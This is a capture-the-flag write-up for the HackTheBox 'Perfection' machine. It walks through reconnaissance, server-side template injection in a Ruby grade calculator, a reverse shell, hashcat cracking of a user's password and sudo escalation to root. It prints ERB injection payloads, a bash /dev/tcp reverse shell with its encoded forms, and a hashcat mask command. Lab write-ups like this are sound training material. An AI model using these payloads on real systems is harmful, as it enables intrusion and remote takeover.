+++
title = 'Perfection'
date = 2024-07-19T14:39:25+05:30
slug = "HTB-Perfection"
categories = ["hackthebox","Perfection","linux","Easy"]
+++

Startign with nmap 

![perfection 1](https://dl.dropbox.com/scl/fi/kx982jejvm51n9uaw31ou/Pasted-image-20240428172105.png?rlkey=yyntjx1bnkhj9j4cw81208jza&st=ltd2oesi&dl=0)

![perfection 2](https://dl.dropbox.com/scl/fi/07pr7iebbt11f1bzlelc0/Pasted-image-20240428172547.png?rlkey=6boj54ev711y8q6x8fapcz3zj&st=t1hgi5xr&dl=0)

the website dashboard

checked the wappalyzer to find the technologies website is using but couldn't find any 
I tried directory fuzzing 

Found this at the bottom of the website 

![perfection 2](https://dl.dropbox.com/scl/fi/4h7qzrzgdij4y2mwggn6d/Pasted-image-20240428172356.png?rlkey=h55s17ycmae2gj42q3fis4qlf&st=v7skct6p&dl=0)

![perfection 3](https://dl.dropbox.com/scl/fi/eosiqi38dyjraggin3hko/Pasted-image-20240428172442.png?rlkey=wc4xvjbx8rcus2ryp833h2yxk&st=onml3qmn&dl=0)

![perfection 4](https://dl.dropbox.com/scl/fi/n23s7rj4ljwibar8y34q6/Pasted-image-20240428172517.png?rlkey=p98x6u6apxkdbk6r4gzrgitwq&st=q1fa4xj7&dl=0)

we got another info that susan is sysadmin 

we can see this in the about us and there might me a vulnerability on secure coding

![perfection 5](https://dl.dropbox.com/scl/fi/8czuqbffm3m6ybblxlyp2/Pasted-image-20240428172611.png?rlkey=mlz0ojlkmoxkm2bj14u40di30&st=wjmf3l0j&dl=0)

there is a input field in the website , there might be a input validation vulnerbility

let's do some rearch on the technologies the website is using WEBrick 

![perfection 6](https://dl.dropbox.com/scl/fi/ybz3os28u7dpuczy6lb4u/Pasted-image-20240428172643.png?rlkey=qcxrlcqbj5zal9b1tra5c3oj8&st=k1roabx6&dl=0)

but there is no information about vulnerbilities

![perfection 7](https://dl.dropbox.com/scl/fi/vmner2o0vp56ovlx168oa/Pasted-image-20240428172712.png?rlkey=p5xq5p78wqtkzgri697dyvuxi&st=5drybtfk&dl=0)


the above is the robots.txt file we got something intresting 

now we've gatherd information available in the website the next part will be testing the inputs

![perfection 8](https://dl.dropbox.com/scl/fi/bsa478pi15jegiqdmoh4i/Pasted-image-20240428172824.png?rlkey=aqwa3tctjgrjmq48vga5r36i9&st=d4iglepj&dl=0)

i did burpsuite scan to get more information about the vulnerbilities and the results are 

![perfection 9](https://dl.dropbox.com/scl/fi/eatb1xyitnx8si3b4s0p1/Pasted-image-20240428172841.png?rlkey=k6mlz4rdrs220x0049xx7xr12&st=0gebdusd&dl=0)
to know how to perform a scan in burpsuite refer to [[scanning with burp scanner]]
so i confirmed that there is a way to bypass the input in the calculator

after adding single '  i got this result 

![perfection 10](https://dl.dropbox.com/scl/fi/n5gokptftk1ng998x3prj/Pasted-image-20240428173049.png?rlkey=1eiijyj3hgvbgd5m8pfuamfeq&st=tvc4gir2&dl=0)

after bit of research i came to know that it is a SSTI vulnerbility (server side template injection)
refer [[SSTI vulnerbility]] 

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

search for ruby payloads in this website

![perfection 11](https://dl.dropbox.com/scl/fi/0noe8981v7fw3rd4b8p00/Pasted-image-20240428173117.png?rlkey=aypy87w1a2yzbvo5v7gr7l4jk&st=mvc5795e&dl=0)


let's try some payloads and see what happens

![perfection 12](https://dl.dropbox.com/scl/fi/7mfd8koua6ont36yyx39x/Pasted-image-20240428173215.png?rlkey=7o5e94a8vauv3qsuvcfgf4e6a&st=zhcwz6to&dl=0)

we've got same result let's keep trying
to encode select the characters and do ctrl+u to do url encoding

![perfection 13](https://dl.dropbox.com/scl/fi/58yrzotidpsj41pym9yvn/Pasted-image-20240428173655.png?rlkey=ai1mzgkwjscdhzxqgktcied94&st=1sfko5bl&dl=0)

i've multiplied 7* 7 and i got the result 49 so <%= 7* 7 %> payload works 

now let's add a linux command to thi payload to see if it works 

![perfection 14](https://dl.dropbox.com/scl/fi/gktzqa2p8zzlrqiqt83hy/Pasted-image-20240428173754.png?rlkey=b8r96umkvvl9k3o82kjaxuqfb&st=4u84j1pi&dl=0)

we got susan as the username if we used whoami comamnd here

let's do ls and pwd to knwo the direcotries and present directory
to execute commands use  ` 'these 

![perfection 15](https://dl.dropbox.com/scl/fi/yx5332o9f22rzlh9tlbxv/Pasted-image-20240428173826.png?rlkey=s9mtnv3oacnt8lrjw0c2c38q1&st=y0nmi8am&dl=0)

we got some details

using revshells.com website i created a python payload and gave me shell access

![perfection 16](https://dl.dropbox.com/scl/fi/o6qwugbfs5hyeaw5frj3p/Pasted-image-20240428173912.png?rlkey=xrqe4lgyeix89ep6zr7elgmdy&st=qt0bvjwk&dl=0)

We can generate payload manually on our terminal refer to [[#Generate Payload]]

![perfection 18](https://www.dropbox.com/scl/fi/o5bqluapks7zzdxdh3zuo/Pasted-image-20240428174443.png?rlkey=sqqkdafl6aqwbca7xsqrzwpb5&st=1rbq7jxa&dl=0)

to get neat terminal we did 
python3 -c 'import pty; pty.spawn("/bin/bash")'


we got the user flag now

![perfection 19](https://dl.dropbox.com/scl/fi/tlmq6axnw80401uplnhst/Pasted-image-20240428174552.png?rlkey=5cxamrau1kz1b8xhpxrwk38sn&st=jzy2ixjd&dl=0)

cracking password with hash cat  using this command
```
hashcat -m 1400 <hashhere> -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
```

![perfection 20](https://dl.dropbox.com/scl/fi/cs33msyywl4i2377zddqc/Pasted-image-20240428174743.png?rlkey=ccbuu45rbmb431apwv8awvvz4&st=x3fea1yl&dl=0)

refer [[Hashcat]] to learn using hashacat

after sometime we finally cracked hashcat password 
susan_nasus_413759210

![perfection 21](https://dl.dropbox.com/scl/fi/o10opz8t9du2ajbn8fvu0/Pasted-image-20240428174954.png?rlkey=ih1dij52arygvzdfp11hnlp03&st=h9qyj53d&dl=0)


using sudo bash we switched to root user and got root flag
![perfection 22](https://dl.dropbox.com/scl/fi/sfqcyp74fen4scv6gjfza/Pasted-image-20240428175215.png?rlkey=mv1m9qgrto16itn1oeblvw4wm&st=u5iwnpjp&dl=0)


### Generate Payload

Using hURL to encode and decode payloads demonstrates how we can mess around with data to take advantage of weaknesses in web applications.

Specifically, the payload we’re making for the Weighted Grade Calculator app is made to run a reverse shell command. This way, we can exploit any possible vulnerabilities that let us run code on the server’s side.

```
┌──(kali㉿kali)-[~]
└─$ hURL -B "bash -i >& /dev/tcp/10.10.14.213/7373 0>&1"

Original       :: bash -i >& /dev/tcp/10.10.14.213/7373 0>&1                                                                                                                                                     
base64 ENcoded :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx

┌──(kali㉿kali)-[~]
└─$ hURL -U "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx"

Original    :: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx                                                                                                                                          
URL ENcoded :: YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMTMvNzM3MyAwPiYx
```

```
category1=a%0A<%25%3Dsystem("ping+-c1+$myIP");%25>
```
the above is the another paylaod from the write up 
